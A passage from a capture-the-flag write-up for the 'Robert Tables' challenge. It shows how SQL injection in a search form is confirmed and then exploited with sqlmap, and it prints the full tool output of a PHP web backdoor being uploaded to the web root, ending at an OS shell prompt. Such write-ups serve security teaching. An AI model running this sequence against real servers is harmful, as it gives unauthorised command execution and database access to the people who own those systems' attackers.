Robert Tables (500)
======

A good sales guy always keeps track of his customers.

http://104.131.43.243:8883/

Solution
------

*Writeup by Michael Zhang (failedxyz)*

Alright, we're presented with a search form. Let's see if it's susceptible to SQL injection by entering `'` in the box. As we expected, the result is `null` (since the no result message actually reads `no result`, we know that this caused an error). So let's use SQLmap to further investigate.

To use SQLmap on this URL, the command I ran was:

```bash
./sqlmap.py -u "http://104.131.43.243:8883/index.php" --method POST --data="search=?"
```

SQLmap confirms that this DB is MySQL, and saves the results of the probing to a file. Now we can dig around the database and look for information. Unfortunately, the database seems rather empty, and none of the tables contains any useful information. Let's take a different approach instead.

SQLmap has a feature that allows you to execute OS commands by uploading an executable PHP file. This requires a directory that has write-permissions on. Typically this directory would be the document root of the server, which in most installations is `/var/www/somesite.com`, or something like that. We can find this easily by navigating to any page on the site that will return 404, like: http://104.131.43.243:8883/404. We can see that at the bottom of the page, it tells us what directory the files are served from, which is `/var/www/ecustomers/` (note: servers usually don't do this; I think they only tell you what version of the server software it's running and sometimes what distribution of Linux it's running).

Anyway, now we feed this information to SQLmap and get our OS shell!

```bash
[19:25:12] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.12
[19:25:12] [INFO] going to use a web backdoor for command prompt
[19:25:12] [INFO] fingerprinting the back-end DBMS operating system
[19:25:12] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
[19:25:13] [WARNING] unable to retrieve automatically the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /usr/local/apache2/htdocs, /var/www/nginx-default') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 2
please provide a comma separate list of absolute directory paths: /var/www/ecustomers
[19:25:18] [WARNING] unable to automatically parse any web server path
[19:25:18] [INFO] trying to upload the file stager on '/var/www/ecustomers/' via LIMIT 'LINES TERMINATED BY' method
[19:25:18] [WARNING] unable to upload the file stager on '/var/www/ecustomers/'
[19:25:18] [INFO] trying to upload the file stager on '/var/www/ecustomers/' via UNION method
[19:25:18] [WARNING] expect junk characters inside the file as a leftover from UNION query
[19:25:18] [INFO] the local file '/tmp/sqlmapKsXckS698/tmpaaDxwI' and the remote file '/var/www/ecustomers/tmpuryls.php' have the same size (711 B)
[19:25:18] [INFO] the file stager has been successfully uploaded on '/var/www/ecustomers/' - http://104.131.43.243:8883/tmpuryls.php
[19:25:18] [INFO] the backdoor has been successfully uploaded on '/var/www/ecustomers/' - http://104.131.43.243:8883/tmpbhhwq.php
[19:25:18] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> 
```

Perfect. Now 
